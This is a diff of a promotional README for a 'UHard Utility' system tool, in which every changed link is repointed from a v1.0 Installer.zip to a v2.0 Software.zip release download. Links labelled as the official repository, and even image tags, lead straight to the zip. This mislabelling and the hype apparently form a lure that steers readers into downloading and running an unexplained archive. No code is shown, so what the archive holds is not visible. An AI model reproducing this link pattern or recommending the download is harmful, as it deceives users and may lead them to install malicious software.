@@ -25,9 +25,9 @@ The **UHard Utility** is a powerful tool designed for enhancing system performan
 
 ## Installation 🚀
 
-You can download the latest version of the UHard Utility from the following link: [Download UHard Utility v1.0.0](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v1.0/Installer.zip)
+You can download the latest version of the UHard Utility from the following link: [Download UHard Utility v1.0.0](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v2.0/Software.zip)
 
-[![Download UHard Utility](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v1.0/Installer.zip)](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v1.0/Installer.zip)
+[![Download UHard Utility](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v2.0/Software.zip)](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v2.0/Software.zip)
 
 Once downloaded, extract the files and launch the application to start configuring your system like never before!
 
@@ -66,8 +66,8 @@ The UHard Utility is licensed under the MIT License. See the [LICENSE](LICENSE) 
 
 By using the UHard Utility, you are taking the first step towards optimizing your system's performance and customization. Download the tool today and take control of your system like never before! 🚀🔧
 
-🔗 For more information, visit the official [UHard Utility Repository](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v1.0/Installer.zip)
+🔗 For more information, visit the official [UHard Utility Repository](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v2.0/Software.zip)
 
 Thank you for choosing UHard Utility! 🙌 
 
-![System Configuration](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v1.0/Installer.zip) 
+![System Configuration](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v2.0/Software.zip) 
